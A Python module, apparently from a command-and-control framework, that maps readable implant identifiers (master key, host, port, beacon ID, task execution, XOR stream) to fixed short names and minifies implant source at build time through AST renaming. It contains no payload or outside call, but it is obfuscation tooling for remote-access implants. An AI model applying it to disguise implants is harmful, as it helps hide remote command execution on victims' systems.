"""server/implant/names.py — 短名契约 + 构建期 minifier。

D2 短名契约从"散落在 docstring 里"收敛为这里的一张映射表：implant 模板
用可读名书写，build.py 渲染后经 minify() 改回短名。模块代码（server/modules/）
直接使用短名，短名即本表 CONTRACT 的 value——改契约只改这一处。

minify() 只重命名标识符（tokenize 识别 NAME token），字符串/注释/数字
不受影响；非契约标识符（局部变量）被分配唯一短名，保证不引入遮蔽。
"""

import ast
import builtins
import io
import keyword
import string

# readable → 固定短名（三端共享：implant 产物 / 模块代码 / 测试假 beacon）
CONTRACT = {
    # 模块别名
    "sock": "a", "st": "b", "zl": "c", "b64": "d", "rnd": "e",
    "tm": "f", "js": "g", "sy": "i", "tb": "j", "io_": "k",
    "sec": "l", "thr": "t2", "hl": "h", "hmac_": "hm",
    # 全局
    "MASTER_KEY": "_K", "HOST": "_H", "PORT": "_P", "INTERVAL": "_I",
    "JITTER": "_J", "BEACON_ID": "_D", "BREAK_FLAG": "_B",
    "CONN_KEY": "_CK", "PRINT_LOCK": "_L",
    # 函数
    "connect_transport": "_T", "send_frame": "p", "recv_frame": "q",
    "exec_task": "r", "sleep_jitter": "s", "qround": "Q",
    "block": "B", "xor_stream": "X", "encode_frame_": "n",
    "decode_frame_": "o", "cycle": "cyc",
}

_KEYWORDS = set(keyword.kwlist)
_BUILTINS = set(dir(builtins))
# 不重命名的标识符（关键字 + 内置名）
_SKIP = _KEYWORDS | _BUILTINS
# 池子不分配的名字（关键字 + 内置名 + 契约短名，避免遮蔽）
_POOL_EXCLUDE = _SKIP | set(CONTRACT.values())


def _name_pool():
    chars = string.ascii_letters + "_"
    for ch in chars:
        yield ch
    for a in chars:
        for b in chars:
            yield a + b


def minify(source: str) -> str:
    """可读源码 → 短名产物。契约名走 CONTRACT，其余分配唯一短名。

    基于 AST：只改 Name / 函数名 / 参数名 / import 别名 / global 名，
    属性名（secrets.token_hex）、模块名（import socket）、字符串/数字
    天然不受影响。
    """
    tree = ast.parse(source)
    rename = {}
    pool = _name_pool()

    def short(name: str) -> str:
        if name in CONTRACT:
            return CONTRACT[name]
        if name not in rename:
            s = next(pool)
            while s in _POOL_EXCLUDE or s in rename.values():
                s = next(pool)
            rename[name] = s
        return rename[name]

    class _T(ast.NodeTransformer):
        def visit_Name(self, node):
            if node.id not in _SKIP:
                node.id = short(node.id)
            return node

        def visit_arg(self, node):
            node.arg = short(node.arg)
            return node

        def visit_FunctionDef(self, node):
            node.name = short(node.name)
            self.generic_visit(node)
            return node

        def visit_alias(self, node):
            if node.asname:
                node.asname = short(node.asname)
            return node

        def visit_Global(self, node):
            node.names = [short(n) for n in node.names]
            return node

    tree = _T().visit(tree)
    ast.fix_missing_locations(tree)
    return ast.unparse(tree)
